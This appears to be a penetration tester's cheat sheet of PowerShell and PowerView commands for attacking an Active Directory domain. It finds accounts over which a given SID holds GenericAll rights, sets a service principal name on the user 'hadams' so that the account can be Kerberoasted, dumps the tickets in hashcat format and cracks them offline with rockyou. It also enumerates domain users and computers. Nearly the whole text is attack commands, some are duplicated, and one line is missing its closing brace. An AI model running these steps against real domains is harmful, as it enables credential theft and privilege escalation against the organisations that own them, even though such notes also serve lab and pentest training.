# dot source scripts
. .\Invoke-Kerberoast.ps1

# invoke kerberoast
Invoke-Kerberoast

#GenericAll
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
Get-ObjectAcl -SamAccountName hadams -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}

# see if account has principal name
Get-DomainUser -Identity hadams | select serviceprincipalname

# set principal name for user
Set-DomainObject -Identity hadams -Set @{serviceprincipalname='ops/whatever1'

# dot source scripts
. .\Invoke-Kerberoast.ps1

# invoke kerberoast
Invoke-Kerberoast

# invoke kerberoast with output format hashcat and output to txt file
Invoke-Kerberoast -OutputFormat Hashcat > hashcat.txt

# get ticket and copy. Join Lines & Find Replace spaces in hash file. Search for \s* reg ex and replace all with nothing to get rid of spaces in hash

# transfer to attack machine for hashcat
hashcat -m 13100 hash.txt rockyou.txt 
hashcat -m 13100 hash.txt rockyou.txt --show

# import powerview
. .\Powerview.ps1

# see what user is a member of (Domain Admins)
Get-DomainUser -SamAccountName hadams

# Return all computers or specific computer objects in AD.
Get-DomainComputer

